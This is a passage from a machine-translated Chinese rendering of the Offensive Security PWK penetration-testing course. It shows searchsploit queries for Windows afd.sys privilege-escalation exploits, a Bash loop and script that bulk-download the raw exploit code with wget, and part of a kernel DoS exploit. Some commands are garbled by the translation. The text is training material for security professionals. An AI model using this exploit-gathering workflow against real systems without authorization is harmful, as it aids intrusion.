<div style="position:absolute;top:148675;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="126"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 126 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:148708;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:149785;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:149785;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:149785;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">126</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:148804;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Microsoft Windows - 'AfdJoinLeaf' 特权 | </font><font style="vertical-align: inherit;">https://www.exploit-db.com/exploits/21844</font></font></nobr></div>
<div style="position:absolute;top:148820;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Microsoft Windows - 'afd.sys' 本地内核 | </font><font style="vertical-align: inherit;">https://www.exploit-db.com/exploits/18755</font></font></nobr></div>
<div style="position:absolute;top:148837;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Microsoft Windows 7 (x64) - 'afd.sys' Dang | </font><font style="vertical-align: inherit;">https://www.exploit-db.com/exploits/39525</font></font></nobr></div>
<div style="position:absolute;top:148854;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Microsoft Windows 7 (x86) - 'afd.sys' Dang | </font><font style="vertical-align: inherit;">https://www.exploit-db.com/exploits/39446</font></font></nobr></div>
<div style="position:absolute;top:148872;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Microsoft Windows 7 内核 - 基于池的 Ou | </font><font style="vertical-align: inherit;">https://www.exploit-db.com/exploits/42009</font></font></nobr></div>
<div style="position:absolute;top:148888;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Microsoft Windows XP - 'afd.sys' 本地内核 | </font><font style="vertical-align: inherit;">https://www.exploit-db.com/exploits/17133</font></font></nobr></div>
<div style="position:absolute;top:148905;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Microsoft Windows XP/2003 - 'afd.sys' Priv | </font><font style="vertical-align: inherit;">https://www.exploit-db.com/exploits/6757</font></font></nobr></div>
<div style="position:absolute;top:148922;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Microsoft Windows XP/2003 - 'afd.sys' Priv | </font><font style="vertical-align: inherit;">https://www.exploit-db.com/exploits/18176</font></font></nobr></div>
<div style="position:absolute;top:148939;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-------------------------------------------------- ---------------------</font></font></nobr></div>
<div style="position:absolute;top:148959;left:301"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 178 - 使用 searchsploit 搜索漏洞</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:148988;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这是一个好的开始，但我们需要调整结果。</font><font style="vertical-align: inherit;">目前，我们只对漏洞利用程序感兴趣</font></font></nobr></div>
<div style="position:absolute;top:149008;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">URL，所以让我们</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">grep</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">搜索“http”，然后</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">剪切</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们需要的内容。</font><font style="vertical-align: inherit;">我们将使用“|” </font><font style="vertical-align: inherit;">字段分隔符和提取</font></font></nobr></div>
<div style="position:absolute;top:149027;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第二个字段：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:149062;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">searchsploit afd windows -w -t | </font><font style="vertical-align: inherit;">grep http | </font><font style="vertical-align: inherit;">cut -f 2 -d "|"</font></font></font></b></nobr></div>
<div style="position:absolute;top:149079;left:117"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">https://www.exploit-db.com/exploits/40564</font></font></nobr></div>
<div style="position:absolute;top:149095;left:117"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">https://www.exploit-db.com/exploits/21844</font></font></nobr></div>
<div style="position:absolute;top:149112;left:117"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">https://www.exploit-db.com/exploits/18755</font></font></nobr></div>
<div style="position:absolute;top:149130;left:117"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">https://www.exploit-db.com/exploits/39525</font></font></nobr></div>
<div style="position:absolute;top:149147;left:117"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">https://www.exploit-db.com/exploits/39446</font></font></nobr></div>
<div style="position:absolute;top:149164;left:117"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">https://www.exploit-db.com/exploits/42009</font></font></nobr></div>
<div style="position:absolute;top:149180;left:117"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">https://www.exploit-db.com/exploits/17133</font></font></nobr></div>
<div style="position:absolute;top:149197;left:117"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">https://www.exploit-db.com/exploits/18176</font></font></nobr></div>
<div style="position:absolute;top:149214;left:117"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">https://www.exploit-db.com/exploits/6757</font></font></nobr></div>
<div style="position:absolute;top:149234;left:278"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 179 - 从 searchsploit 的输出中提取 URL</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:149263;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这样看起来好一点。</font><font style="vertical-align: inherit;">现在我们有了每个漏洞利用的 URL，我们可以使用 Bash 循环来</font></font></nobr></div>
<div style="position:absolute;top:149283;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">下载文件并将它们保存在本地。</font><font style="vertical-align: inherit;">然而，在我们这样做之前，我们注意到每一页</font></font></nobr></div>
<div style="position:absolute;top:149302;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">有一个下载“原始”漏洞利用代码的链接，这正是我们所追求的： </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:149863;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="127"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 127 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:149896;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:150973;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:150973;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:150973;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">127</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:150554;left:344"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 17：Exploit-DB 原始下载 URL</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:150585;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们看到每个原始页面（如</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">/exploits/40564</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">）都链接到原始漏洞利用（如</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">/raw/40564</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">）。</font><font style="vertical-align: inherit;">武装</font></font></nobr></div>
<div style="position:absolute;top:150605;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">有了这些信息，我们运行 sed ( </font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">sed 's/exploits/raw/'</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> ) 来修改下载 URL 和</font></font></nobr></div>
<div style="position:absolute;top:150624;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">将其插入 Bash one-liner 以下载漏洞利用的原始代码：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:150659;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">for e in $(searchsploit afd windows -w -t | grep http | cut -f 2 -d "|");</font></font></font></b></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:11px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:150676;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">do exp_name=$(echo $e | cut -d "/" -f 5) &amp;&amp; url=$(echo $e | sed 's/exploits/raw/') &amp;&amp;</font></font></b></nobr></div>
<div style="position:absolute;top:150693;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">wget -q --no-check-certificate $url -O $exp_name; </font><font style="vertical-align: inherit;">完毕</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:150712;left:294"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 180 - 使用一些 Bash-fu 下载所有漏洞</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:150741;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">请注意 for 循环的使用，该循环遍历</font><font style="vertical-align: inherit;">我们抓取</font><font style="vertical-align: inherit;">的</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">SearchSploit</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> URL。</font><font style="vertical-align: inherit;">在圈内，</font></font></nobr></div>
<div style="position:absolute;top:150761;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们将</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">exp_name</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">设置</font><font style="vertical-align: inherit;">为漏洞利用的“名称”（使用 grep、cut 和命令替换），将</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">url 设置</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">为</font></font></nobr></div>
<div style="position:absolute;top:150780;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">原始下载位置（再次使用 sed 和命令替换）。</font><font style="vertical-align: inherit;">如果成功（</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">&amp;&amp;</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">），</font></font></nobr></div>
<div style="position:absolute;top:150799;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们使用</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">wget</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">获取漏洞利用</font><font style="vertical-align: inherit;">（在没有证书检查的安静模式下）将其保存在本地</font></font></nobr></div>
<div style="position:absolute;top:150819;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">漏洞利用名称作为本地文件名。</font></font></nobr></div>
<div style="position:absolute;top:150851;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">一旦我们运行它，我们等待命令提示符并验证漏洞确实是</font></font></nobr></div>
<div style="position:absolute;top:150871;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">已下载，使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">file</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">验证文件是否为文本：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:150906;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ls -l</font></font></font></b></nobr></div>
<div style="position:absolute;top:150923;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">共 124 </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:151051;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="128"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 128 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:151084;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:152161;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:152161;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:152161;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">128</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:151180;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-rw-r--r-- 1 根 1363 Mar 7 19:52 17133</font></font></nobr></div>
<div style="position:absolute;top:151196;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-rw-r--r-- 1 根 12215 Mar 7 19:52 18176</font></font></nobr></div>
<div style="position:absolute;top:151213;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-rw-r--r-- 1 根 9698 Mar 7 19:52 18755</font></font></nobr></div>
<div style="position:absolute;top:151230;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-rw-r--r-- 1 根 11590 3 月 7 日 19:52 21844</font></font></nobr></div>
<div style="position:absolute;top:151248;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-rw-r--r-- 1 根 10575 Mar 7 19:52 39446</font></font></nobr></div>
<div style="position:absolute;top:151264;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-rw-r--r-- 1 根 14193 Mar 7 19:52 39525</font></font></nobr></div>
<div style="position:absolute;top:151281;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-rw-r--r-- 1 根 32674 Mar 7 19:52 40564</font></font></nobr></div>
<div style="position:absolute;top:151298;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-rw-r--r-- 1 根 12643 Mar 7 19:52 42009</font></font></nobr></div>
<div style="position:absolute;top:151315;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-rw-r--r-- 1 根 619 Mar 7 19:52 6757</font></font></nobr></div>
<div style="position:absolute;top:151349;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">文件 17133</font></font></font></b></nobr></div>
<div style="position:absolute;top:151366;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">17133：C 源代码，ASCII 文本，带有 CRLF 行终止符</font></font></nobr></div>
<div style="position:absolute;top:151386;left:299"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 181 - 验证文件确实已下载</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:151415;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们可以检查每个漏洞利用，并看到我们确实抓住了原始漏洞利用：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:151450;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">猫 17133</font></font></font></b></nobr></div>
<div style="position:absolute;top:151467;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">///////////////////////////////////////////////// /////////////////////////</font></font></nobr></div>
<div style="position:absolute;top:151484;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">//</font></font></nobr></div>
<div style="position:absolute;top:151501;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">// 标题：Microsoft Windows xp AFD.sys 本地内核 DoS 漏洞利用</font></font></nobr></div>
<div style="position:absolute;top:151518;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">// 作者：东软公司李陆峰</font></font></nobr></div>
<div style="position:absolute;top:151535;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">// 供应商：www.microsoft.com</font></font></nobr></div>
<div style="position:absolute;top:151552;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">// 易受攻击：Windows xp sp3</font></font></nobr></div>
<div style="position:absolute;top:151569;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">//</font></font></nobr></div>
<div style="position:absolute;top:151586;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">///////////////////////////////////////////////// ///////////////////////////</font></font></nobr></div>
<div style="position:absolute;top:151619;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">#include &lt;stdio.h&gt;</font></font></nobr></div>
<div style="position:absolute;top:151636;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">#include &lt;Winsock2.h&gt;</font></font></nobr></div>
<div style="position:absolute;top:151671;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">#pragma 注释（lib，“ws2_32.lib”）</font></font></nobr></div>
<div style="position:absolute;top:151704;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">字节 buf[]={</font></font></nobr></div>
<div style="position:absolute;top:151721;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">0xac,0xfd,0xd3,0x00,0x01,0x00,0x00,0x00,0x00,0x00,</font></font></nobr></div>
<div style="position:absolute;top:151738;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">0x00,0x00,0x20,0x00,0x00,0x00,0xe8,0xfd,0xd3,0x00,</font></font></nobr></div>
<div style="position:absolute;top:151755;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">0xb8,0xfd,0xd3,0x00,0xf8,0xfd,0xd3,0x00,0xc4,0xfd,</font></font></nobr></div>
<div style="position:absolute;top:151772;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">0xd3,0x00,0xcc,0xfd,0xd3,0x00}；</font></font></nobr></div>
<div style="position:absolute;top:151806;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">int main()</font></font></nobr></div>
<div style="position:absolute;top:151823;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:151842;left:337"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 182 - 查看下载的漏洞利用</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:151872;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">尽管我们在 Bash one-liner 上取得了成功，但我们的代码不是很干净，也不是</font></font></nobr></div>
<div style="position:absolute;top:151891;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">特别容易重复使用。</font><font style="vertical-align: inherit;">让我们把所有东西放在一个 Bash 脚本中来解决这些问题：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:151926;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">cat dlsploits.sh</font></font></font></b></nobr></div>
<div style="position:absolute;top:151943;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">#!/bin/bash</font></font></nobr></div>
<div style="position:absolute;top:151960;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"># Bash 脚本来搜索给定的漏洞并下载所有匹配项。</font></font></nobr></div>
<div style="position:absolute;top:151994;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">for e in $(searchsploit afd windows -w -t | grep http | cut -f 2 -d "|")</font></font></nobr></div>
<div style="position:absolute;top:152028;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">做</font></font></nobr></div>
<div style="position:absolute;top:152045;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">exp_name=$(echo $e | cut -d "/" -f 5)</font></font></nobr></div>
<div style="position:absolute;top:152062;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">url=$(echo $e | sed 's/exploits/raw/')</font></font></nobr></div>
<div style="position:absolute;top:152079;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">wget -q --no-check-certificate $url -O $exp_name</font></font></nobr></div>
<div style="position:absolute;top:152096;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">完毕 </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:152239;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="129"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 129 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:152272;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:153349;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:153349;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:153349;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">129</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:152368;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">chmod +x ./dlsploits.sh</font></font></font></b></nobr></div>
<div style="position:absolute;top:152401;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">./dlsploits.sh</font></font></font></b></nobr></div>
<div style="position:absolute;top:152421;left:305"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 183 - 使用 Bash 脚本下载文件</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:152450;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们现在可以手动检查漏洞利用，找到我们感兴趣的漏洞，在测试中尝试</font></font></nobr></div>
<div style="position:absolute;top:152470;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">机器，最后</font><font style="vertical-align: inherit;">在我们的目标上</font><font style="vertical-align: inherit;">运行</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">适当的</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">漏洞利用，因为霰弹枪随机漏洞利用</font></font></nobr></div>
<div style="position:absolute;top:152489;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">活目标是糟糕的形式，是彻底灾难的秘诀。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:152523;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">5.7.3 实际的 Bash 用法——示例 3</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:152561;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">作为渗透测试人员，我们一直在努力寻找效率以最大限度地减少我们花费的时间</font></font></nobr></div>
<div style="position:absolute;top:152581;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">分析数据，尤其是我们在各种扫描期间恢复的数据量。</font></font></nobr></div>
<div style="position:absolute;top:152613;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">假设我们的任务是扫描 C 类子网以识别 Web 服务器并确定</font></font></nobr></div>
<div style="position:absolute;top:152633;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">它们是否存在有趣的攻击面。</font><font style="vertical-align: inherit;">端口扫描的过程</font></font></nobr></div>
<div style="position:absolute;top:152652;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">检查远程机器上的 TCP 或 UDP 端口，以检测哪些服务是</font></font></nobr></div>
<div style="position:absolute;top:152672;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在目标上运行以及可能存在哪些攻击向量。</font><font style="vertical-align: inherit;">我们将讨论端口扫描</font></font></nobr></div>
<div style="position:absolute;top:152691;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在另一个模块中有更多细节，但现在，让我们保持一般性，因为这是一个很好的例子</font></font></nobr></div>
<div style="position:absolute;top:152710;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这展示了 Bash 脚本如何自动化一个相当乏味的任务。</font></font></nobr></div>
<div style="position:absolute;top:152743;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">为了实现我们的目标，我们将首先端口扫描整个子网以查明潜在的</font></font></nobr></div>
<div style="position:absolute;top:152762;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">打开网络服务，然后我们就可以手动浏览他们的网页了。</font></font></nobr></div>
<div style="position:absolute;top:152795;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">首先，让我们创建一个用于本练习的临时文件夹：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:152830;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">mkdir temp</font></font></font></b></nobr></div>
<div style="position:absolute;top:152864;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">cd temp/</font></font></font></b></nobr></div>
<div style="position:absolute;top:152883;left:264"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 184 - 创建一个用于本练习的临时文件夹</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:152913;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">现在我们已经创建了目录并使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">cd</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">进入了它</font><font style="vertical-align: inherit;">，让我们继续进行更多</font></font></nobr></div>
<div style="position:absolute;top:152932;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">有趣的部分，C 类子网的扫描。</font><font style="vertical-align: inherit;">我们将只关注端口 80 以保持范围</font></font></nobr></div>
